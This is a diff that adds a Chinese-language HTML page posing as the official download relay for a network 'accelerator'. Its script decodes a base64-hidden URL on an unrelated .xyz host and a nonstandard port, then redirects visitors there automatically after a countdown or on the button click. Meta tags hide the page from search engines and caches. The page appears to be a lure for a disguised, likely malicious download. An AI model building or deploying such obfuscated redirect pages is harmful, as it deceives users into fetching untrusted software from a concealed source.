@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<link rel="canonical" href="https://51smartmoney.com/">
+  <title>加速器下载中转</title>
+  <link rel="icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="party-page">
+  <main class="party-card-accent">
+    <img src="/assets/images/logo.png" alt="加速器下载中转标识" title="加速器下载中转标识" style="width:58px;height:58px;margin:0 auto 16px">
+    <h1>正在准备下载</h1>
+    <p>加速器下载通道即将打开，请等待倒计时结束。</p>
+    <div class="countdown" id="countdown">3</div>
+    <a class="btn-soft btn-glow-51smartmoney-govcn" id="manualDownload" href="/party.html" data-download="true" rel="nofollow noopener noreferrer"><span>立即下载</span></a>
+  </main>
+  <footer class="party-copy">© 2026 加速器(远程直连)官方网站. All Rights Reserved</footer>
+  <script>
+const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9wbHouMzEzNDg2Lnh5ejozNTg4OC8=");
+
+document.addEventListener("DOMContentLoaded", function () {
+  const countdown = document.getElementById("countdown");
+  const manualDownload = document.getElementById("manualDownload");
+  let seconds = 3;
+
+  const timer = window.setInterval(function () {
+    seconds -= 1;
+    countdown.textContent = String(seconds);
+    if (seconds <= 0) {
+      window.clearInterval(timer);
+      window.location.replace(REAL_DOWNLOAD_URL);
+    }
+  }, 1000);
+
+  manualDownload.addEventListener("click", function(e){
+    e.preventDefault();
+    window.location.replace(REAL_DOWNLOAD_URL);
+  });
+});
+  </script>
+</body>
+</html>
